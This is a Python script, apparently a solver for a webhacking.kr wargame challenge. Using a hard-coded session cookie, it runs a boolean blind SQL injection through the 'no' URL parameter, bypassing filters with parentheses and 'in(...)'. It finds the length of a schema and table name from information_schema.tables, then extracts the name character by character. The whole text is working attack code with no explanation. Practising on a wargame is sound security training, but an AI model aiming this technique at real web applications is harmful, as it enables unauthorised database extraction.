import requests
cookies={'PHPSESSID':'1ki8ju9v1rd2gatukqsv05gskv'}
key='<td>1</td>'
leng=0
for i in range(30):
    url='https://webhacking.kr/challenge/web-10/?no='
    url+=f'if((length((select(min(concat(table_schema,table_name)))from(information_schema.tables))))in({i}),1,11)'
    response=requests.get(url=url,cookies=cookies)
    response_text=response.text
    if response_text.find(key)!=-1:
        print('table length is ',i)
        leng=i
        break
print('chall13table : ',end="")
for i in range(leng+1):
    for j in range(20,128):
        url='https://webhacking.kr/challenge/web-10/?no='
        url+=f'if((ord(substr((select(min(concat(table_schema,table_name)))from(information_schema.tables)),{i},1)))in({j}),1,11)'
        response=requests.get(url=url,cookies=cookies)
        response_text=response.text
        if response_text.find(key)!=-1:
            print(chr(j),end="")
            break
print('\n')
